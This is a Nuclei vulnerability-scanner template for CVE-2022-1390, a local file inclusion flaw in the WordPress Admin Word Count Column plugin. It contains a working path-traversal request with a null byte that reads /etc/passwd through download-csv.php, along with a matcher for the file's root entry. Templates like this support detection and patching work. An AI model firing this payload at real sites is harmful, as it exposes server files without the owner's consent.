id: CVE-2022-1390

info:
  name: WordPress Admin Word Count Column 2.2 - Local File Inclusion
  author: daffainfo,Splint3r7
  severity: critical
  description: |
    The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attackers to read arbitrary files on server running old version of PHP susceptible to the null byte technique. This could also lead to RCE by using a Phar Deserialization technique.
  remediation: |
    Update to the latest version of the WordPress Admin Word Count Column plugin (2.2 or higher) to fix the local file inclusion vulnerability.
  reference:
    - https://packetstormsecurity.com/files/166476/WordPress-Admin-Word-Count-Column-2.2-Local-File-Inclusion.html
    - https://wordpress.org/plugins/admin-word-count-column/
    - https://wpscan.com/vulnerability/6293b319-dc4f-4412-9d56-55744246c990
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1390
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1390
    cwe-id: CWE-22
    epss-score: 0.96836
    epss-percentile: 0.9957
    cpe: cpe:2.3:a:admin_word_count_column_project:admin_word_count_column:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: admin_word_count_column_project
    product: admin_word_count_column
    framework: wordpress
  tags: packetstorm,wpscan,cve,cve2022,wordpress,wp-plugin,lfi,wp

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502203a15c8df4832bf980329237f3b1f010e4b6d8efdeac481fc4b025c5e9e768fa6022100cf9f71008ae9e9a21132f50a0fb6ae6e71e278e47db9b86cd9f3324af51dd533:922c64590222798bb761d5b6d8e72950